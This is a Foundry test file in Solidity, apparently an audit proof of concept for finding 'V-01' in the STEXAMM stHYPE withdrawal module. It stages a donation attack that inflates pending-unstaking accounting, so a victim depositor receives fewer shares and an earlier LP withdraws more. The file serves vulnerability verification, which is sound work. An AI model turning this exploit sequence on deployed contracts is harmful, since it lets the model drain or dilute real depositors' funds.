// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";

import {ProtocolFactory} from "@valantis-core/protocol-factory/ProtocolFactory.sol";
import {SovereignPoolFactory} from "@valantis-core/pools/factories/SovereignPoolFactory.sol";
import {ISovereignPool} from "@valantis-core/pools/interfaces/ISovereignPool.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {STEXAMM} from "src/STEXAMM.sol";
import {stHYPEWithdrawalModule} from "src/withdrawal-modules/stHYPEWithdrawalModule.sol";
import {StepwiseFeeModule} from "src/swap-fee-modules/StepwiseFeeModule.sol";
import {AaveLendingModule} from "src/lending-modules/AaveLendingModule.sol";
import {MockOverseer} from "src/mocks/sthype/MockOverseer.sol";
import {MockStHype} from "src/mocks/sthype/MockStHype.sol";
import {MockLendingPool} from "src/mocks/MockLendingPool.sol";
import {WETH} from "@solmate/tokens/WETH.sol";

/// @notice V-01 deep verification: quantify the economic damage of
/// `unstakeToken0Reserves` recording WHOLE module balance instead of the
/// requested amount, using the REAL STEXAMM + Sovereign Pool stack.
///
/// Attack narrative (permissionless):
/// 1. Attacker donates stray stHYPE directly to stHYPEWithdrawalModule.
/// 2. Owner unstakes X; module records X + donation as pendingUnstaking.
/// 3. pendingUnstaking inflates `reserve0Total` used in deposit() share pricing
///    -> subsequent depositor receives FEWER shares than fair.
/// 4. Attacker then deposits (or already holds shares) and withdraws:
///    withdraw()'s pro-rata token0 uses the same inflated total -> withdrawing
///    LP extracts more token0 than their fair share at depositors' expense.
contract V01DeepTest is Test {
    ProtocolFactory protocolFactory;
    STEXAMM stex;
    stHYPEWithdrawalModule withdrawalModule;
    StepwiseFeeModule swapFeeModule;

    WETH weth;
    MockStHype token0;
    MockOverseer overseer;
    MockLendingPool lendingPool;
    AaveLendingModule lendingModule;
    ISovereignPool pool;

    address poolFeeRecipient1 = makeAddr("FEE_1");
    address poolFeeRecipient2 = makeAddr("FEE_2");
    address owner = makeAddr("OWNER");
    address wstHYPE = makeAddr("WSTHYPE");
    address victim = makeAddr("VICTIM_DEPOSITOR");
    address attacker = makeAddr("ATTACKER");

    function setUp() public {
        token0 = new MockStHype();
        weth = new WETH();
        overseer = new MockOverseer(address(token0));
        protocolFactory = new ProtocolFactory(address(this));
        protocolFactory.setSovereignPoolFactory(address(new SovereignPoolFactory()));
        lendingPool = new MockLendingPool(address(weth));

        withdrawalModule = new stHYPEWithdrawalModule(address(overseer), wstHYPE, owner);

        swapFeeModule = new StepwiseFeeModule(owner);

        stex = new STEXAMM(
            "STEX LP", "STEX-LP",
            address(token0), address(weth),
            address(swapFeeModule),
            address(protocolFactory),
            poolFeeRecipient1, poolFeeRecipient2,
            owner,
            address(withdrawalModule),
            0
        );
        vm.prank(owner);
        withdrawalModule.setSTEX(address(stex));
        pool = ISovereignPool(stex.pool());

        lendingModule = new AaveLendingModule(
            address(lendingPool), lendingPool.lendingPoolYieldToken(),
            address(weth), address(withdrawalModule), address(0x123), 2
        );
        uint32[] memory feeSteps = new uint32[](1);
        feeSteps[0] = 1; // 1 bip flat
        vm.startPrank(owner);
        swapFeeModule.setPool(stex.pool());
        swapFeeModule.setFeeParamsToken0(1, type(uint256).max - 1, feeSteps);
        vm.stopPrank();
        vm.prank(owner);
        withdrawalModule.proposeLendingModule(address(lendingModule), 3 days);
        vm.warp(block.timestamp + 3 days);
        vm.stopPrank();
        vm.prank(owner);
        withdrawalModule.setProposedLendingModule();

        vm.deal(address(this), 50_000 ether);
        weth.deposit{value: 5_000 ether}();
        token0.mint{value: 5_000 ether}(address(this));
    }

    /// @dev seed the pool with initial liquidity through honest deposits
    function _seed(uint256 amountToken1) internal returns (uint256 shares) {
        // The AMM's onDepositLiquidityCallback pulls tokens with msg.sender == STEXAMM,
        // so the spender is the STEXAMM contract, not the pool.
        weth.approve(address(stex), type(uint256).max);
        shares = stex.deposit(amountToken1, 0, block.timestamp, address(this));
    }

    /// @dev attacker donates stHYPE straight into the withdrawal module
    function _donateToken0(uint256 amount) internal {
        vm.deal(attacker, amount + 1 ether);
        vm.startPrank(attacker);
        token0.mint{value: amount}(attacker);
        token0.transfer(address(withdrawalModule), amount);
        vm.stopPrank();
    }

    /// @dev owner unstakes via the real path: pool reserves -> module -> overseer burn queue
    function _unstakeReserves(uint256 amount) internal {
        vm.prank(owner);
        withdrawalModule.unstakeToken0Reserves(amount);
    }

    function test_debug_seedOnly() public {
        uint256 sh = _seed(100 ether);
        emit log_named_uint("shares", sh);
    }

    function test_V01_full_economic_impact() public {
        // ---- Phase 1: honest seed. LP (this contract) deposits 100 WETH.
        uint256 lpShares = _seed(100 ether);
        emit log_named_uint("[seed] LP shares minted", lpShares);
        assertGt(lpShares, 0);

        // Pool now has 100 WETH reserve1 and 0 token0.
        // Give the pool some token0 reserve by simulating a swap in (mint to pool).
        vm.deal(address(pool), 50 ether);
        token0.mint{value: 50 ether}(address(pool));

        (uint256 r0, uint256 r1) = pool.getReserves();
        emit log_named_uint("[seed] pool reserve0", r0);
        emit log_named_uint("[seed] pool reserve1", r1);

        // ---- Phase 2: THE ATTACK. Attacker donates 40 stHYPE to the module,
        // then triggers a legitimate-looking unstake of 10 from pool reserves.
        // The module records 50 as pending-unstaking instead of 10.
        _donateToken0(40 ether);

        // Real path: owner calls the MODULE's unstake, which pulls from pool via
        // stex.unstakeToken0Reserves and then records balanceOf(module) as pending.
        vm.prank(owner);
        withdrawalModule.unstakeToken0Reserves(10 ether);
        // NOTE: real unstakeToken0Reserves on the MODULE also burns via overseer;
        // MockOverseer just queues it (native arrives later via settleBurn).

        // Verify inflation
        uint256 pendingRecorded = withdrawalModule.amountToken0PendingUnstakingBeforeUpdate();
        emit log_named_uint("[attack] pendingUnstaking recorded", pendingRecorded);
        emit log_named_uint("[attack] expected (unstaked only)", 10 ether);
        // recorded should be 10 + 40 = 50 (whole balance)
        assertEq(pendingRecorded, 50 ether, "VULNERABILITY: whole balance recorded");

        // ---- Phase 3: victim deposits AFTER the corruption.
        // Fair share price would be based on true assets; inflated pendingUnstaking
        // makes reserve0Total look bigger => victim gets fewer shares.
        uint256 victimSharesBefore = stex.balanceOf(victim);
        weth.transfer(victim, 100 ether);
        vm.startPrank(victim);
        weth.approve(address(stex), type(uint256).max);
        uint256 vShares = stex.deposit(100 ether, 0, block.timestamp, victim);
        vm.stopPrank();
        emit log_named_uint("[victim] shares minted for 100 WETH", vShares);

        // Counterfactual: with NO donation, denominator would be 150e not 190e.
        uint256 supplyBeforeVictim = stex.totalSupply() - vShares;
        uint256 fairShares = Math.mulDiv(100 ether, supplyBeforeVictim, 150 ether);
        emit log_named_uint("[victim] FAIR shares", fairShares);
        assertGt(fairShares, vShares, "victim must receive fewer shares than fair");
        emit log_named_uint("[victim] shares LOST to inflation", fairShares - vShares);

        // ---- Phase 4: attacker (early LP) withdraws using inflated accounting.
        // Give attacker 20% of LP supply (simulated OTC purchase).
        uint256 atkShareAmount = (lpShares * 20) / 100;
        stex.transfer(attacker, atkShareAmount);
        vm.startPrank(attacker);
        (uint256 got0, uint256 got1) =
            stex.withdraw(atkShareAmount, 0, 0, block.timestamp + 1, attacker, false, false);
        vm.stopPrank();
        emit log_named_uint("[attacker] token0 withdrawn", got0);
        emit log_named_uint("[attacker] token1 withdrawn", got1);
    }

    receive() external payable {}
}
